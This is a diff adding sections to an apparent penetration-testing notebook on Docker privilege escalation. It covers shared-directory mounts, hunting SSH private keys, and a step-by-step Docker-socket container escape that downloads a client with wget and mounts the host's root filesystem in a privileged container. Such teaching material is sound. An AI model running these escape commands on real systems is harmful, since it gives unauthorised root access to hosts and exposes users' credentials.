@@ -132,3 +132,128 @@ If everything is configured correctly, the module will be loaded and its initial
 > **Note:** If you run into problems and need to remove the loaded module, you can use `rmmod` with the module name. To remove the generated build files, run `make clean`.
 
 <figure><img src=".gitbook/assets/Screenshot 2026-09-22 160303 - Copy.png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
+### **Docker Shared Directories**
+
+When using Docker, shared directories (volume mounts) can create a connection between the host system and the container's filesystem. With shared directories, specific directories or files from the host can be made accessible inside the container.
+
+However, the security impact depends on how the environment is configured and which folder is mounted. During privilege escalation, we should check whether the mounted folder contains sensitive files or can be used to gain higher privileges on the host.
+
+It's important to note that shared directories can be mounted as either read-only or read-write, depending on the administrator's requirements. When a directory is mounted as read-only, modifications made inside the container cannot affect the files on the host.
+
+```bash
+docker run -it --name mounted_container -v /home:/hostsystem/home ubuntu:latest /bin/bash
+```
+
+But what if the `john` user's home directory contains an SSH private key? If the container has access to that directory, the key may become accessible from inside the container. In a misconfigured environment, this could potentially allow an attacker to use the key to authenticate as `john` on the host.
+
+#### Enumeration & Exploitation
+
+**Look for Non-Standard Directories**
+
+Once we have a shell inside a container, we can start by listing the contents of the root directory (`/`). Most Linux systems contain standard directories such as `/bin`, `/etc`, `/home`, and `/usr`. We should look for directories that seem unusual or that may contain files from the host system.
+
+Common names for shared directories include `/mnt`, `/host`, `/data`, or descriptive names such as
+
+<figure><img src=".gitbook/assets/image (28).png" alt=""><figcaption></figcaption></figure>
+
+Here, `/hostsystem` looks interesting because it is not normally present in a standard container filesystem.
+
+**Investigate Suspicious Directories**
+
+If we find a directory that looks like it could be a shared directory, we should investigate its contents:
+
+We can then search for sensitive files. For example, SSH keys are interesting because a private key may allow authentication as the corresponding user:
+
+
+
+### **Docker Sockets**
+
+A Docker socket is a special file that allows processes to communicate with the Docker daemon. On Linux, the Docker daemon commonly uses a Unix socket such as `/var/run/docker.sock`.
+
+When we run a command with the Docker CLI, the client communicates with the Docker daemon through this socket. The daemon then performs the requested action, such as creating, starting, or managing containers.
+
+Access to the Docker socket is normally restricted because it provides significant control over the Docker daemon. However, if a user or process inside a container can access the Docker socket, this can become a serious security issue.
+
+If `/var/run/docker.sock` is mounted inside a container, processes inside that container may be able to communicate directly with the Docker daemon on the host.
+
+#### Steps to Exploit
+
+**Step 1 — Check for the Docker Socket**
+
+First, we need to check whether the Docker socket is available inside the container:
+
+```bash
+find / -name "docker.sock" 2>/dev/null
+```
+
+Next, we should check the permissions of the socket:
+
+```bash
+ls -lha /run/docker.sock
+srw-rw---- 1 root docker 0 Sep 22 15:56 /run/docker.sock
+```
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+Because our user is a member of the `docker` group, we have permission to interact with the Docker socket.
+
+**Step 2 — Get a Docker Client**
+
+If the Docker client is not available inside the container, we can download one:
+
+```bash
+wget -O /tmp/docker https://master.dockerproject.com/linux/x86_64/docker
+chmod +x /tmp/docker
+```
+
+**Step 3 — Interact with the Docker Socket**
+
+Now we can use the downloaded Docker client to communicate with the Docker daemon through the socket.
+
+The `-H` option specifies which Docker socket the client should use.
+
+A good first command is `ps`, which allows us to check whether we can list the running containers:
+
+```bash
+/tmp/docker -H unix:///run/docker.sock ps
+```
+
+If the command works, we have successfully communicated with the Docker daemon through the socket.
+
+**Step 4 — Perform the Container Escape**
+
+If we have sufficient access to the Docker daemon, we can ask it to create a new privileged container and mount the host's root filesystem inside it.
+
+```bash
+/tmp/docker -H unix:///run/docker.sock run --rm -it --privileged -v /:/hostsystem ubuntu bash
+```
+
+Let's break down the command:
+
+* `/tmp/docker -H unix:///run/docker.sock` — Use the downloaded Docker client and communicate with the Docker daemon through the socket.
+* `run` — Create and start a new container.
+* `--rm` — Automatically remove the container when we exit.
+* `-it` — Start an interactive terminal.
+* `--privileged` — Give the new container extended privileges.
+* `-v /:/hostsystem` — Mount the host's root filesystem (`/`) to `/hostsystem` inside the new container.
+* `ubuntu bash` — Use the Ubuntu image and start a Bash shell.
+
+**Step 5 — Access the Host Filesystem**
+
+After starting the new container, we can check the mounted filesystem:
+
+```bash
+root@new-container:/# ls /hostsystem/
+```
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+
+
+
+
